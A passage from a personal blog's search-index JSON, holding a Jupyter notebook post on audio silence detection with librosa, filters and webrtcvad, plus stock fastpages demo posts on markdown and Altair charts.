5.08517007 6.26938776 7.24462585 7.45360544 7.59292517 8.56816327 8.82358277 9.65950113 9.82204082 10.07746032 10.82049887 11.05269841 12.72453515 13.7229932 14.83755102 17.57750567 17.7168254 20.06204082 20.50321995 22.19827664 22.9877551 24.31129252 25.82058957 25.9599093 27.44598639 28.76952381 30.02340136 30.27882086 31.46303855 31.85777778 32.57759637 33.01877551 33.43673469 34.04045351 34.2029932 34.89959184 35.85160998 36.03736961 36.82684807 36.9661678 37.08226757 40.12408163 40.47238095 41.7262585 42.16743764 42.49251701 42.72471655 43.11945578 43.95537415 44.35011338 44.55909297 45.48789116 45.88263039 47.06684807 49.43528345 49.7139229 50.38730159 55.89043084 56.86566893 57.00498866 57.1907483 58.83936508 58.90902494 59.09478458 59.53596372 60.58086168 60.85950113 63.48335601 64.04063492 66.61804989 66.71092971 67.1753288 67.89514739 68.28988662 68.6614059 69.49732426 69.84562358 71.09950113 71.23882086 71.77287982 73.6769161 73.86267574 75.37197279 75.76671202 77.53142857 80.898322 81.68780045 82.8952381 83.63827664 84.19555556 85.31011338 85.4029932 85.61197279 85.82095238 86.30857143 88.07328798 88.6770068 89.48970522 89.60580499 90.6739229 90.74358277 92.34575964 92.43863946 92.60117914 95.20181406 95.6429932 99.07954649 101.07646259 101.49442177 104.9077551 105.18639456 105.34893424 105.46503401 106.04553288 106.50993197 106.81179138 107.13687075 109.06412698 110.73596372 112.129161 113.24371882 114.03319728 114.91555556 115.10131519 115.56571429 116.51773243 122.32272109 122.64780045 123.11219955 123.34439909 123.59981859 125.15555556 126.31655329 126.57197279 126.75773243 129.21904762 129.52090703 130.54258503] . def cut_recording(x, sr): # x = cut(x, onset_times[-1], sr) x = cut(x, cut_by_integration(x, width=sr), sr) plot_wav(x, sr) return x def cut(x, endtime, sr): print(&quot;cutting at &quot; + str(endtime)) return x[:int(endtime+0.5)*sr] def cut_by_integration(x, width=sr): # integrate in a sliding window area of interest, the magnitude gives us a value to judge where to cut length = len(x) seconds = int(length/sr) windows = range(0, length, sr) intx = [abs(sum(x[a: a+sr])) for a in windows] # print(intx) plt.figure() plt.plot(intx) for i in range(seconds-1, 0, -1): # print(intx[i]) if intx[i] &gt; 200: # cutoff print(&quot;cutoff reached&quot;) return i+1 if i+1 &lt; seconds-1 else seconds-1 return -1 # cut_at = cut_by_integration(x_left, width=sr) # print(&quot;we should cut at {}&quot;.format(cut_at)) x = cut_recording(x, sr) . cutoff reached cutting at 131 0.0 131.0 2888550 2888550 2888550 . def length_gen(a, sr, seconds=0.01): window_len = int(sr * seconds) # frames per window length = len(a) # generate first window i = 1 result = 0 value = a[0] prev_delta = (a[1]-a[0] &gt; 0) while i &lt; window_len: # print(&quot;a[{}] = {}&quot;.format(i, a[i])) if a[i] &gt; a[i-1] and not prev_delta: # increasing and was decreasing before result += value - a[i-1] value = a[i-1] prev_delta = True elif a[i] &lt; a[i-1] and prev_delta: # decreasing and was increasing before result += a[i-1] - value value = a[i-1] prev_delta = False else: # increasing / decreasing like normal pass i += 1 yield result # generate each consecutive window in a fast linear way # window[i] = window generated starting from ith sample, width w # = length_of_string([a[i], a[i+1], ..., a[i+w-1]]) # window[i+1] = window[i] - abs(a[i+1]-a[i]) + abs(a[i+w-1]-a[i+w-2]) while i &lt; length-(window_len-1): result += -abs(a[i+1]-a[i]) + abs(a[i+window_len-1]-a[i+window_len-2]) yield result i += 1 # length = len(x) # seconds = 0.01 # window_len = int((length/(sr * 0.01))) # # windows = np.arange(0, length - window_len, window_len*0.5) # windows = [int(a) for a in windows] # length_gen(x, sr, window_len) a = x res = [0]*int(0.005*sr) + [a for a in length_gen(a, sr)] + [0]*int(0.005*sr) res = np.array(res) # print(res[-10:]) plot_wav(res, sr) res_onsets = librosa.onset.onset_detect(res, sr, backtrack = True) res_times = librosa.frames_to_time(res_onsets, sr) print(res_times) # plot_xvis(res, START, DUR, res_times, sr) . 0.0 130.9901133786848 2888332 2888332 2888332 [ 1.36997732 1.85759637 2.94893424 3.0185941 3.13469388 3.52943311 3.92417234 4.10993197 4.29569161 5.08517007 5.41024943 6.26938776 7.33750567 7.4768254 7.54648526 7.80190476 8.54494331 9.63628118 9.82204082 10.07746032 10.89015873 11.02947846 11.81895692 12.4923356 12.67809524 13.69977324 13.88553288 14.83755102 14.97687075 15.27873016 15.37160998 15.55736961 17.5078458 17.92580499 18.92426304 20.06204082 20.20136054 20.36390023 20.50321995 20.57287982 21.64099773 21.7106576 21.94285714 22.17505669 22.84843537 23.03419501 23.33605442 24.07909297 24.28807256 24.4738322 25.54195011 25.82058957 25.98312925 26.56362812 27.05124717 27.30666667 27.72462585 28.11936508 28.67664399 28.76952381 28.95528345 29.28036281 29.72154195 29.88408163 30.09306122 31.4862585 31.57913832 31.85777778 32.39183673 32.57759637 33.01877551 33.25097506 33.50639456 34.24943311 34.41197279 34.52807256 34.89959184 34.9692517 35.85160998 36.01414966 36.80362812 37.12870748 37.2215873 37.45378685 37.9414059 38.49868481 40.05442177 40.17052154 40.30984127 40.449161 41.7262585 42.16743764 42.28353741 42.49251701 42.77115646 43.09623583 43.90893424 43.90893424 44.11791383 44.35011338 44.55909297 44.9538322 45.51111111 45.69687075 46.23092971 47.06684807 47.18294785 47.27582766 47.36870748 47.50802721 49.41206349 49.55138322 49.69070295 50.08544218 50.45696145 50.78204082 50.85170068 51.85015873 53.9631746 54.05605442 54.38113379 55.10095238 55.28671202 55.42603175 55.89043084 57.00498866 57.1907483 57.28362812 57.74802721 57.91056689 58.81614512 58.88580499 59.09478458 59.30376417 59.53596372 60.27900227 60.85950113 61.950839 63.46013605 64.06385488 64.2031746 66.57160998 66.68770975 67.24498866 67.52362812 67.91836735 68.28988662 68.63818594 69.4276644 69.56698413 69.86884354 70.96018141 71.02984127 71.23882086 71.4245805 71.74965986 71.88897959 72.16761905 72.30693878 73.74657596 73.86267574 74.16453515 74.35029478 74.41995465 75.37197279 75.74349206 75.90603175 76.02213152 76.27755102 77.50820862 77.64752834 77.78684807 77.9261678 79.87664399 80.29460317 80.898322 81.29306122 81.68780045 81.82712018 82.19863946 82.96489796 83.10421769 83.63827664 84.21877551 85.37977324 85.61197279 85.82095238 86.05315193 86.21569161 86.4246712 86.58721088 86.79619048 87.16770975 87.9107483 88.07328798 88.25904762 88.6770068 88.97886621 89.1878458 89.48970522 89.58258503 90.72036281 91.69560091 92.29931973 92.46185941 92.60117914 92.81015873 94.1569161 95.20181406 95.6429932 95.75909297 96.13061224 97.70956916 97.8953288 98.10430839 98.4061678 99.07954649 99.47428571 99.93868481 100.42630385 101.14612245 104.04861678 104.9077551 105.04707483 105.1631746 105.32571429 105.48825397 105.67401361 106.04553288 106.53315193 106.85823129 106.99755102 107.1600907 107.27619048 109.92326531 110.55020408 111.17714286 111.33968254 112.129161 113.22049887 113.4062585 113.47591837 113.98675737 115.33351474 115.56571429 115.79791383 116.47129252 116.61061224 116.77315193 117.56263039 118.02702948 119.9078458 120.23292517 122.29950113 122.41560091 122.6245805 122.78712018 123.32117914 123.59981859 124.3660771 124.59827664 125.06267574 125.57351474 126.40943311 126.59519274 126.80417234 126.89705215 127.1292517 127.94195011 129.21904762 129.52090703 129.66022676 129.98530612 130.54258503] . # source: https://manual.audacityteam.org/man/dc_offset.html # Audacity&#39;s DC removal method performs a calculation to make the average positive and negative sample values equal. def dc_removal(x, sr): x_mean = np.mean(x) print(x_mean) x = [e - x_mean for e in x] plot_wav(x, sr) return x x = dc_removal(x, sr) . -0.5383372 0.0 131.0 2888550 2888550 2888550 . START = 51 #121#11 DUR = 4 #2#5 def plot_xvis(x, start, dur, onset_times, sr): end = start + dur x_vis = x[start*sr:end*sr] plot_wav(x_vis, sr) for onset in onset_times: if onset &lt; start: continue elif onset &gt; end: break plt.axvline(x=onset-start) plot_xvis(x, START, DUR, onset_times, sr) . 0.0 4.0 88200 88200 88200 . # D = np.abs(librosa.stft(x))**2 # S = librosa.feature.melspectrogram(S=D) def get_S(x, sr): x = np.array(x) return librosa.feature.melspectrogram(y=x, sr=sr, n_mels=128, fmax=8000) def plot_ms(x, sr): import librosa.display S = get_S(x, sr) plt.figure(figsize=(10, 4)) librosa.display.specshow(librosa.power_to_db(S, ref=np.max), y_axis=&#39;mel&#39;, fmax=8000, x_axis=&#39;time&#39;) plt.colorbar(format=&#39;%+2.0f dB&#39;) plt.title(&#39;Mel spectrogram&#39;) plt.tight_layout() plt.show() def plot_msvis(x, start, dur, sr): end = start + dur x_vis = x[start*sr:end*sr] plot_ms(x_vis, sr) # plot_ms(x) plot_msvis(x, START, DUR, sr) . def high_pass_filter(x, sr, cutOff = 500): from scipy import signal #Creation of filter print(cutOff) # cutOff = 10 # Cutoff frequency nyq = 0.5 * sr N = 5 # Filter order fc = cutOff / nyq # Cutoff frequency normal b, a = signal.butter(N, fc, btype=&#39;high&#39;) # high pass filter # b, a = signal.butter(N, fc) # low pass filter #Apply the filter tempf = signal.filtfilt(b, a, x) print(tempf) return tempf def low_pass_filter(x, sr, cutOff = 14000): from scipy import signal #Creation of filter print(cutOff) # cutOff = 10 # Cutoff frequency nyq = 0.5 * sr N = 5 # Filter order fc = cutOff / nyq # Cutoff frequency normal b, a = signal.butter(N, fc) # high pass filter # b, a = signal.butter(N, fc) # low pass filter #Apply the filter tempf = signal.filtfilt(b, a, x) print(tempf) return tempf # tempf_left = high_pass_filter(x_left, sr) # tempf_right = high_pass_filter(x_right, sr) # plot_xvis(tempf_left, START, DUR, onset_times, sr) # plot_xvis(tempf_right, START, DUR, onset_times, sr) normal_t = high_pass_filter(x, sr, cutOff=20) t = high_pass_filter(x, sr, cutOff=300) plot_xvis(t, 0, 6, onset_times, sr) # tempf = [] # start =4.0 # end = 20.0 # step = 0.5 # n = int(( end - start ) / step) # for i in np.arange(start,end,step): # result = high_pass_filter(x_left, sr, cutOff = i) # tempf.append(result) # # plot_xvis(a, START, DUR, onset_times, sr) . 20 [ 0.037224 -0.2199548 -0.16112052 ... -0.00069032 0.00764033 0.00267946] 300 [-2.62774982e-03 -2.46485494e-01 -1.74353522e-01 ... -3.69619853e-03 4.76901651e-03 -4.98514644e-05] 0.0 6.0 132300 132300 132300 . # fig.set_figheight(20) # fig.set_figwidth(6) # fig.suptitle(&#39;Vertically stacked subplots&#39;) # print(&quot;len(tempf) = {} == n = {} ?&quot;.format(len(tempf), n)) # for i in range(n): # axs[i].plot(range(DUR*sr), tempf[i][START*sr:(START+DUR)*sr]) mfcc = librosa.feature.mfcc(y=np.array(normal_t[START*sr:(START+DUR)*sr]), sr=sr) plt.figure(figsize=(10,4)) librosa.display.specshow(mfcc, x_axis=&quot;time&quot;) plt.colorbar() plt.title(&#39;MFCC&#39;) plt.tight_layout() plt.show() . # plot_msvis(t, START, DUR, sr) print(t) s = get_S(t, sr) nstart = 7 ndur = 7 plot_msvis(t, nstart, ndur, sr) # mfcc = librosa.feature.mfcc(y=np.array(normal_t), sr=sr) # mfccvis = librosa.feature.mfcc(y=np.array(normal_t[nstart*sr:(nstart+ndur)*sr]), sr=sr) # plt.figure(figsize=(10,4)) # librosa.display.specshow(mfccvis, x_axis=&quot;time&quot;) # plt.colorbar() # plt.title(&#39;MFCC&#39;) # plt.tight_layout() # plt.show() # print(np.shape(mfcc[0])) # plot_xvis(mfcc[0], nstart, ndur, [], int(sr/512)) plot_xvis(t, nstart, ndur, [], sr) # remove the lower frequencies from the mel spectrogram print(&quot;shape of s:&quot;, np.shape(s)) sums = np.sum(s, axis=0) print(&quot;sums shape:&quot; ,np.shape(sums), &quot;=&quot;, sums) plot_xvis(sums, nstart, ndur, [], int(sr/512)) threshold = np.heaviside(sums - np.mean(sums),1) # threshold = np.heaviside(sums - 5,1) print(threshold) plot_xvis(threshold, nstart, ndur, [], int(sr/512)) print(len(sums)) print(np.mean(sums)) # calculate each silence based on threshold ntimes1 = [] ntimes2 = [] i = 0 silence = (threshold[i] == 1.0) sounds = [] curr_sound = [] for i in range(1, len(threshold)): if threshold[i] == 1.0 and threshold[i-1] &lt; 1.0: #start of sound if not curr_sound: ntimes1.append(i*512/sr) curr_sound.append(i*512/sr) elif threshold[i] == 0.0 and threshold[i-1] &gt; 0.0: #end of sound if curr_sound: ntimes2.append(i*512/sr) curr_sound.append(i*512/sr) sounds.append(curr_sound) curr_sound = [] # apply minimum length of 0.1 seconds for silence # for i in range(1, len(ntimes)): print(&quot;before: len = &quot;, len(sounds)) i = 1 min_len = 0.15 while i &lt; len(sounds): if sounds[i][0]-sounds[i-1][1] &lt; min_len: # this silence is too short sounds[i-1][1] = sounds[i][1] sounds.pop(i) i -= 1 i += 1 print(&quot;now, sounds: &quot;, len(sounds)) nonsets = librosa.onset.onset_detect(int(sr/512), onset_envelope = threshold, backtrack = True) ntimes = librosa.frames_to_time(res_onsets, sr) print(&quot;onset_detects: &quot;,len(ntimes)) ssounds = np.array(sounds) ssounds = ssounds.flatten() plot_xvis(threshold, nstart, ndur, ssounds, int(sr/512)) # RMS rms = librosa.feature.rms(S = s) print(np.shape(rms)) print(rms[0]) p = plot_xvis(rms[0], nstart, ndur, [], int(sr/512)) rms_vis = rms[0][nstart*int(sr/512):(nstart+ndur)*int(sr/512)] # take the gradient of the RMS drms = np.gradient(rms[0]) # take the magnitude only mdrms = np.absolute(drms) plot_xvis(mdrms, nstart, ndur, [], int(sr/512)) mdrms_vis = mdrms[nstart*int(sr/512):(nstart+ndur)*int(sr/512)] plt.figure(figsize=(20, 6)) plt.xlabel(&#39;time&#39;) plt.ylabel(&#39;amplitude&#39;) print(0., len(rms_vis)/int(sr/512), len(rms_vis)) print(len(rms_vis)) tees = np.linspace(0., len(rms_vis)/int(sr/512), len(rms_vis)) print(len(tees)) # time = librosa.samples_to_time(time_series) plt.plot(tees, rms_vis) plt.fill_between(tees, 0, 1, where=rms_vis &gt; 0.025,facecolor=&#39;green&#39;, alpha=0.5) plt.fill_between(tees, 0, 1, where=mdrms_vis &lt; 0.012,facecolor=&#39;red&#39;, alpha=0.5) # tees = np.linspace(0., len(rms_vis)/int(sr/512), len(rms_vis)) # print(len(tees)) # # time = librosa.samples_to_time(time_series) # plt.plot(tees, drms[nstart*int(sr/512):(nstart+ndur)*int(sr/512)]) # plt.fill_between(tees, 0, 1, where=drms &gt; 0.025,facecolor=&#39;green&#39;, alpha=0.5) . [-2.62774982e-03 -2.46485494e-01 -1.74353522e-01 ... -3.69619853e-03 4.76901651e-03 -4.98514644e-05] . 0.0 7.0 154350 154350 154350 shape of s: (128, 5642) sums shape: (5642,) = [37.376507 16.17877 7.9702253 ... 0.46888587 0.5044804 0.47153732] 0.0 7.0 301 301 301 [1. 0. 0. ... 0. 0. 0.] 0.0 7.0 301 301 301 5642 30.74188 before: len = 130 now, sounds: 93 onset_detects: 274 0.0 7.0 301 301 301 (1, 5642) [0.66461897 0.22900887 0.13561964 ... 0.00463763 0.00507792 0.00481982] 0.0 7.0 301 301 301 0.0 7.0 301 301 301 0.0 7.0 301 301 301 . &lt;matplotlib.collections.PolyCollection at 0x7effa61b0190&gt; . nstart = 0 ndur = 15 def test_rms(t, sr, nstart=0, ndur=5): # plot_xvis(t, nstart, ndur, [], sr) t_vis = t[nstart*sr:(nstart+ndur)*sr] t_vis = [20*a + 10 for a in t_vis] plt.figure(figsize=(20, 6)) plt.xlabel(&#39;time&#39;) plt.ylabel(&#39;amplitude&#39;) teess = np.linspace(0., len(t_vis)/sr, len(t_vis)) plt.plot(teess, t_vis) s = get_S(t, sr) # RMS rms = librosa.feature.rms(S = s) # p = plot_xvis(rms[0], nstart, ndur, [], int(sr/512)) rms_vis = rms[0][nstart*int(sr/512):(nstart+ndur)*int(sr/512)] # plt.figure(figsize=(20, 6)) # plt.xlabel(&#39;time&#39;) # plt.ylabel(&#39;amplitude&#39;) print(0., len(rms_vis)/int(sr/512), len(rms_vis)) print(len(rms_vis)) tees = np.linspace(0., len(rms_vis)/int(sr/512), len(rms_vis)) print(len(tees)) # time = librosa.samples_to_time(time_series) plt.plot(tees, rms_vis) plt.fill_between(tees, 0, 20, where=rms_vis &gt; 0.05,facecolor=&#39;green&#39;, alpha=0.5) plt.show for i in range(0, int(len(t)/sr), ndur): test_rms(t, sr, nstart=i, ndur=ndur) . 0.0 15.0 645 645 645 0.0 15.0 645 645 645 0.0 15.0 645 645 645 0.0 15.0 645 645 645 0.0 15.0 645 645 645 0.0 15.0 645 645 645 0.0 15.0 645 645 645 0.0 15.0 645 645 645 0.0 11.209302325581396 482 482 482 . print(&quot;length of x is: &quot; + str(len(x))) print(&quot;that&#39;s equal to &quot; + str(len(x)/sr) + &quot; seconds&quot;) . length of x is: 2888550 that&#39;s equal to 131.0 seconds . # Using the last sound recognised, we will cut out the noise at the end of the recording def cut_recording_sounds(x, sr, sounds): # x = cut(x, onset_times[-1], sr) x = cut(x, sounds[-1][1], sr) # plot_wav(x, sr) return x t_cut = cut_recording_sounds(t, sr, sounds) plot_wav(t_cut, sr) . cutting at 130.6122448979592 0.0 131.0 2888550 2888550 2888550 . &lt;module &#39;matplotlib.pyplot&#39; from &#39;/home/justin/anaconda3/envs/tor/lib/python3.7/site-packages/matplotlib/pyplot.py&#39;&gt; . import webrtcvad vad = webrtcvad.Vad(1) # aggressiveness level window_duration = 0.03 # in seconds samples_per_window = int(window_duration * sr + 0.5) # to round up bytes_per_sample = 2 import struct print(len(x)) # rip = [a for a in x if a &gt;= 1.0] # print(rip) m = max(x) raw_x = [int(sample*32767/m) for sample in x] s = struct.Struct(&quot;%dh&quot; % len(raw_x)) raw_x = s.pack(*raw_x) segments = [] # onsets = [] for start in np.arange(0, len(x), samples_per_window): stop = min(start + samples_per_window, len(x)) is_speech = vad.is_speech(raw_x[start*bytes_per_sample: stop*bytes_per_sample], sample_rate = sr) # output.append(int(is_speech)) if segments and segments[-1][&quot;is_speech&quot;] == is_speech: # extend the previous reading segments[-1][&quot;stop&quot;] = stop else: segments.append(dict( start = start, stop = stop, is_speech = is_speech ) ) # onsets.append(start/(sr*0.03)) print(segments) # onsets = librosa.frames_to_time(onsets) # print(onsets) START = 0 DUR = 1 plot_xvis(x, START, DUR, [], sr) #onsets) for segment in segments: if segment[&quot;is_speech&quot;] == True: xstart = segment[&quot;start&quot;] * window_duration / sr xstop = segment[&quot;stop&quot;] * window_duration / sr print(&quot;start: {}, stop: {}&quot;.format(xstart, xstop)) if xstart &lt; START: continue elif xstop &gt; START + DUR: break else: plt.axvspan(xstart, xstop, alpha=0.5, color=&#39;red&#39;) .",
            "url": "https://blog.justinor.dev/jupyter/audio/2020/05/31/silence-detection-I-librosa-onset-detection.html",
            "relUrl": "/jupyter/audio/2020/05/31/silence-detection-I-librosa-onset-detection.html",
            "date": " • May 31, 2020"
        }
        
    
  
    
        ,"post8": {
            "title": "Fastpages Notebook Blog Post",
            "content": "About . This notebook is a demonstration of some of capabilities of fastpages with notebooks. . With fastpages you can save your jupyter notebooks into the _notebooks folder at the root of your repository, and they will be automatically be converted to Jekyll compliant blog posts! . Front Matter . The first cell in your Jupyter Notebook or markdown blog post contains front matter. Front matter is metadata that can turn on/off options in your Notebook. It is formatted like this: . # &quot;My Title&quot; &gt; &quot;Awesome summary&quot; - toc:true- branch: master - badges: true - comments: true - author: Hamel Husain &amp; Jeremy Howard - categories: [fastpages, jupyter] . Setting toc: true will automatically generate a table of contents | Setting badges: true will automatically include GitHub and Google Colab links to your notebook. | Setting comments: true will enable commenting on your blog post, powered by utterances. | . The title and description need to be enclosed in double quotes only if they include special characters such as a colon. More details and options for front matter can be viewed on the front matter section of the README. . Markdown Shortcuts . A #hide comment at the top of any code cell will hide both the input and output of that cell in your blog post. . A #hide_input comment at the top of any code cell will only hide the input of that cell. . The comment #hide_input was used to hide the code that produced this. . put a #collapse-hide flag at the top of any cell if you want to hide that cell by default, but give the reader the option to show it: . import pandas as pd import altair as alt . . put a #collapse-show flag at the top of any cell if you want to show that cell by default, but give the reader the option to hide it: . cars = &#39;https://vega.github.io/vega-datasets/data/cars.json&#39; movies = &#39;https://vega.github.io/vega-datasets/data/movies.json&#39; sp500 = &#39;https://vega.github.io/vega-datasets/data/sp500.csv&#39; stocks = &#39;https://vega.github.io/vega-datasets/data/stocks.csv&#39; flights = &#39;https://vega.github.io/vega-datasets/data/flights-5k.json&#39; . . place a #collapse-output flag at the top of any cell if you want to put the output under a collapsable element that is closed by default, but give the reader the option to open it: . print(&#39;The comment #collapse-output was used to collapse the output of this cell by default but you can expand it.&#39;) . The comment #collapse-output was used to collapse the output of this cell by default but you can expand it. . . Interactive Charts With Altair . Charts made with Altair remain interactive. Example charts taken from this repo, specifically this notebook. . Example 1: DropDown . # use specific hard-wired values as the initial selected values selection = alt.selection_single( name=&#39;Select&#39;, fields=[&#39;Major_Genre&#39;, &#39;MPAA_Rating&#39;], init={&#39;Major_Genre&#39;: &#39;Drama&#39;, &#39;MPAA_Rating&#39;: &#39;R&#39;}, bind={&#39;Major_Genre&#39;: alt.binding_select(options=genres), &#39;MPAA_Rating&#39;: alt.binding_radio(options=mpaa)} ) # scatter plot, modify opacity based on selection alt.Chart(df).mark_circle().add_selection( selection ).encode( x=&#39;Rotten_Tomatoes_Rating:Q&#39;, y=&#39;IMDB_Rating:Q&#39;, tooltip=&#39;Title:N&#39;, opacity=alt.condition(selection, alt.value(0.75), alt.value(0.05)) ) . Example 2: Tooltips . alt.Chart(df).mark_circle().add_selection( alt.selection_interval(bind=&#39;scales&#39;, encodings=[&#39;x&#39;]) ).encode( alt.X(&#39;Rotten_Tomatoes_Rating&#39;, type=&#39;quantitative&#39;), alt.Y(&#39;IMDB_Rating&#39;, type=&#39;quantitative&#39;, axis=alt.Axis(minExtent=30)), # y=alt.Y(&#39;IMDB_Rating:Q&#39;, ), # use min extent to stabilize axis title placement tooltip=[&#39;Title:N&#39;, &#39;Release_Date:N&#39;, &#39;IMDB_Rating:Q&#39;, &#39;Rotten_Tomatoes_Rating:Q&#39;] ).properties( width=500, height=400 ) . Example 3: More Tooltips . label = alt.selection_single( encodings=[&#39;x&#39;], # limit selection to x-axis value on=&#39;mouseover&#39;, # select on mouseover events nearest=True, # select data point nearest the cursor empty=&#39;none&#39; # empty selection includes no data points ) # define our base line chart of stock prices base = alt.Chart().mark_line().encode( alt.X(&#39;date:T&#39;), alt.Y(&#39;price:Q&#39;, scale=alt.Scale(type=&#39;log&#39;)), alt.Color(&#39;symbol:N&#39;) ) alt.layer( base, # base line chart # add a rule mark to serve as a guide line alt.Chart().mark_rule(color=&#39;#aaa&#39;).encode( x=&#39;date:T&#39; ).transform_filter(label), # add circle marks for selected time points, hide unselected points base.mark_circle().encode( opacity=alt.condition(label, alt.value(1), alt.value(0)) ).add_selection(label), # add white stroked text to provide a legible background for labels base.mark_text(align=&#39;left&#39;, dx=5, dy=-5, stroke=&#39;white&#39;, strokeWidth=2).encode( text=&#39;price:Q&#39; ).transform_filter(label), # add text labels for stock prices base.mark_text(align=&#39;left&#39;, dx=5, dy=-5).encode( text=&#39;price:Q&#39; ).transform_filter(label), data=stocks ).properties( width=500, height=400 ) . Data Tables . You can display tables per the usual way in your blog: . df[[&#39;Title&#39;, &#39;Worldwide_Gross&#39;, &#39;Production_Budget&#39;, &#39;Distributor&#39;, &#39;MPAA_Rating&#39;, &#39;IMDB_Rating&#39;, &#39;Rotten_Tomatoes_Rating&#39;]].head() . Title Worldwide_Gross Production_Budget Distributor MPAA_Rating IMDB_Rating Rotten_Tomatoes_Rating . 0 The Land Girls | 146083.0 | 8000000.0 | Gramercy | R | 6.1 | NaN | . 1 First Love, Last Rites | 10876.0 | 300000.0 | Strand | R | 6.9 | NaN | . 2 I Married a Strange Person | 203134.0 | 250000.0 | Lionsgate | None | 6.8 | NaN | . 3 Let&#39;s Talk About Sex | 373615.0 | 300000.0 | Fine Line | None | NaN | 13.0 | . 4 Slam | 1087521.0 | 1000000.0 | Trimark | R | 3.4 | 62.0 | . Images . Local Images . You can reference local images and they will be copied and rendered on your blog automatically. You can include these with the following markdown syntax: . ![](my_icons/fastai_logo.png) . . Remote Images . Remote images can be included with the following markdown syntax: . ![](https://image.flaticon.com/icons/svg/36/36686.svg) . . Animated Gifs . Animated Gifs work, too! . ![](https://upload.wikimedia.org/wikipedia/commons/7/71/ChessPawnSpecialMoves.gif) . . Captions . You can include captions with markdown images like this: . ![](https://www.fast.ai/images/fastai_paper/show_batch.png &quot;Credit: https://www.fast.ai/2020/02/13/fastai-A-Layered-API-for-Deep-Learning/&quot;) . . Other Elements . GitHub Flavored Emojis . Typing I give this post two :+1:! will render this: . I give this post two :+1:! . Tweetcards . Typing &gt; twitter: https://twitter.com/jakevdp/status/1204765621767901185?s=20 will render this: Altair 4.0 is released! https://t.co/PCyrIOTcvvTry it with: pip install -U altairThe full list of changes is at https://t.co/roXmzcsT58 ...read on for some highlights. pic.twitter.com/vWJ0ZveKbZ . &mdash; Jake VanderPlas (@jakevdp) December 11, 2019 . Youtube Videos . Typing &gt; youtube: https://youtu.be/XfoYk_Z5AkI will render this: . Boxes / Callouts . Typing &gt; Warning: There will be no second warning! will render this: . Warning: There will be no second warning! . Typing &gt; Important: Pay attention! It&#39;s important. will render this: . Important: Pay attention! It&#8217;s important. . Typing &gt; Tip: This is my tip. will render this: . Tip: This is my tip. . Typing &gt; Note: Take note of this. will render this: . Note: Take note of this. . Typing &gt; Note: A doc link to [an example website: fast.ai](https://www.fast.ai/) should also work fine. will render in the docs: . Note: A doc link to an example website: fast.ai should also work fine. . Footnotes . You can have footnotes in notebooks, however the syntax is different compared to markdown documents. This guide provides more detail about this syntax, which looks like this: . For example, here is a footnote {% fn 1 %}. And another {% fn 2 %} {{ &#39;This is the footnote.&#39; | fndetail: 1 }} {{ &#39;This is the other footnote. You can even have a [link](www.github.com)!&#39; | fndetail: 2 }} . For example, here is a footnote 1. . And another 2 . 1. This is the footnote.↩ . 2. This is the other footnote. You can even have a link!↩ .",
            "url": "https://blog.justinor.dev/jupyter/2020/02/20/test.html",
            "relUrl": "/jupyter/2020/02/20/test.html",
            "date": " • Feb 20, 2020"
        }
        
    
  
    
        ,"post9": {
            "title": "An Example Markdown Post",
            "content": "Example Markdown Post . Basic setup . Jekyll requires blog post files to be named according to the following format: . YEAR-MONTH-DAY-filename.md . Where YEAR is a four-digit number, MONTH and DAY are both two-digit numbers, and filename is whatever file name you choose, to remind yourself what this post is about. .md is the file extension for markdown files. . The first line of the file should start with a single hash character, then a space, then your title. This is how you create a “level 1 heading” in markdown. Then you can create level 2, 3, etc headings as you wish but repeating the hash character, such as you see in the line ## File names above. . Basic formatting . You can use italics, bold, code font text, and create links. Here’s a footnote 1. Here’s a horizontal rule: . . Lists . Here’s a list: . item 1 | item 2 | . And a numbered list: . item 1 | item 2 | Boxes and stuff . This is a quotation . . You can include alert boxes …and… . . You can include info boxes Images . . Code . You can format text and code per usual . General preformatted text: . # Do a thing do_thing() . Python code and output: . # Prints &#39;2&#39; print(1+1) . 2 . Formatting text as shell commands: . echo &quot;hello world&quot; ./some_script.sh --option &quot;value&quot; wget https://example.com/cat_photo1.png . Formatting text as YAML: . key: value - another_key: &quot;another value&quot; . Tables . Column 1 Column 2 . A thing | Another thing | . Tweetcards . Altair 4.0 is released! https://t.co/PCyrIOTcvvTry it with: pip install -U altairThe full list of changes is at https://t.co/roXmzcsT58 ...read on for some highlights. pic.twitter.com/vWJ0ZveKbZ . &mdash; Jake VanderPlas (@jakevdp) December 11, 2019 Footnotes . This is the footnote. &#8617; . |",
            "url": "https://blog.justinor.dev/markdown/2020/01/14/test-markdown-post.html",
            "relUrl": "/markdown/2020/01/14/test-markdown-post.html",
            "date": " • Jan 14, 2020"
        }
        
    
  

  
  

  
      ,"page1": {
          "title": "About Me",
          "content": "This website is powered by fastpages 1. . a blogging platform that natively supports Jupyter notebooks in addition to other formats. &#8617; . |",
          "url": "https://blog.justinor.dev/about/",
          "relUrl": "/about/",
          "date": ""
      }
      
  

  

  
  

  

  
  

  

  
  

  
  

  
  

  
      ,"page10": {
          "title": "",
          "content": "Sitemap: {{ “sitemap.xml” | absolute_url }} | .",
          "url": "https://blog.justinor.dev/robots.txt",
          "relUrl": "/robots.txt",
          "date": ""
      }
      
  

}